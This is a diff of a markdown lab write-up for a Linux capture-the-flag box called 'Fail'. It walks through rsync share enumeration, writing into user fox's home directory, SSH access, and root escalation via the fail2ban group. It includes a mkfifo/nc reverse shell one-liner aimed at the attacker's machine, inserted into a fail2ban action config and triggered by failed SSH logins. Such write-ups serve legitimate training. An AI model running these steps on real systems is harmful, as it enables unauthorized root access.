@@ -3,7 +3,7 @@ Alias: Fail
 Date: 5/3/2022
 Platform: Linux
 Difficulty: Intermediate
-Tags:
+Tags: #RsyncShare #Fail2BanPrivilegeEscalation #CreateAutorized_KeysSSHfile
 Status: Finished
 IP: 192.168.143.126
 ---
@@ -134,38 +134,38 @@ Enumerated top 200 UDP ports:
 
 #### -Per googling port 873 enumeration I found "hacktricks" website showing to type "nmap -sV --script "rsync-list-modules" -p <PORT> <IP>" to enumerate shares:
 
-![](Pasted%20image%2020221015215909.png)
+![](Images/Pasted%20image%2020221015215909.png)
 
 #### -Found share "fox" typing "nmap -sV --script "rsync-list-modules" -p 873 192.168.143.126":
 
-![](Pasted%20image%2020221015220513.png)
+![](Images/Pasted%20image%2020221015220513.png)
 #RsyncShare
 
 #### -Per googling port 873 enumeration I found the below web page showing how to list files/directory from rsync server
 
-![](Pasted%20image%2020221015220950.png)
+![](Images/Pasted%20image%2020221015220950.png)
 
-![](Pasted%20image%2020221015221123.png)
+![](Images/Pasted%20image%2020221015221123.png)
 
 #### -Typed "rsync -r 192.168.143.126::fox " and found the below files/directories showing user "fox" home directory and then downloaded all files/directories onto local machine by typing "rsync -av fox@192.168.143.126::fox/ ."
 
-![](Pasted%20image%2020221015221356.png)
+![](Images/Pasted%20image%2020221015221356.png)
 
-![](Pasted%20image%2020221015221635.png)
+![](Images/Pasted%20image%2020221015221635.png)
 
 #### -Found nothing interesting reading the files
 	
 #### -Tested if I can upload files users "fox" home directory by typing "echo "hello world" > testfile.txt" and typing "rsync testfile.txt -r 192.168.143.126::fox" to see if it uploaded to fox's home directory. And I found I can:
 
-![](Pasted%20image%2020221015221837.png)
+![](Images/Pasted%20image%2020221015221837.png)
 
 #### -The directions how to find out how to do this was found on the previous website showing the following: 
 
-![](Pasted%20image%2020221015222046.png)
+![](Images/Pasted%20image%2020221015222046.png)
 
 #### -Googled "port 873 enumeration" and found the following page from hacktricks showing how to copy all files from your  local machine to the rsync server:
 
-![](Pasted%20image%2020221015222900.png)
+![](Images/Pasted%20image%2020221015222900.png)
 
 
 #### Then copied all rsync files to kali machine
@@ -193,7 +193,7 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "ssh -I id_rsa fox@192.168.143.126" and typed in "password" for the password and received an ssh session as user fox
 
-![](Pasted%20image%2020221016090756.png)
+![](Images/Pasted%20image%2020221016090756.png)
 
 ---
 
@@ -202,21 +202,21 @@ Enumerated top 200 UDP ports:
 
 #### -Ran "LunEnum.sh" script and found user "fox" is an owner of "fail2ban" group:
 
-![](Pasted%20image%2020221016091122.png)
+![](Images/Pasted%20image%2020221016091122.png)
 
 #### -Googled "fail2ban privilege escalation" and found the following webpage showing the steps to escalate privileges:
 
-![](Pasted%20image%2020221016091817.png)
+![](Images/Pasted%20image%2020221016091817.png)
 
-![](Pasted%20image%2020221016091921.png)
+![](Images/Pasted%20image%2020221016091921.png)
 
-![](Pasted%20image%2020221016092000.png)
+![](Images/Pasted%20image%2020221016092000.png)
 
-![](Pasted%20image%2020221016092047.png)
+![](Images/Pasted%20image%2020221016092047.png)
 
-![](Pasted%20image%2020221016092139.png)
+![](Images/Pasted%20image%2020221016092139.png)
 
-![](Pasted%20image%2020221016092235.png)
+![](Images/Pasted%20image%2020221016092235.png)
 #Fail2BanPrivilegeEscalation 
 
 ---
@@ -226,16 +226,16 @@ Enumerated top 200 UDP ports:
 
 #### -Per steps above I navigated to "/etc/fail2ban/action.d" folder and typed "ls –la" and found group "fail2ban" has write priviliges on file "iptables-multiport-log.conf":
 
-![](Pasted%20image%2020221016100412.png)
+![](Images/Pasted%20image%2020221016100412.png)
 
 #### -Typed "vim iptables-multiport-log.conf" and typed "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [my kali IP] >/tmp/f" to execute a reverse shell on port 85 (syntax found in www.revshells.com) towards the end of the file in vim
 
-![](Pasted%20image%2020221016100629.png)
+![](Images/Pasted%20image%2020221016100629.png)
 
 #### -Ran a "penelope" listener on kali machine listening on port 85
 
 #### -Typed "ssh @fox192.168.236.126" and typed in random passwords just to make "fail2ban" block my IP found in the steps to escalate privileges on the aforementioned website and then received a root shell on my "penelope" listener: 
 
-![](Pasted%20image%2020221016111525.png)
+![](Images/Pasted%20image%2020221016111525.png)
 ---
 
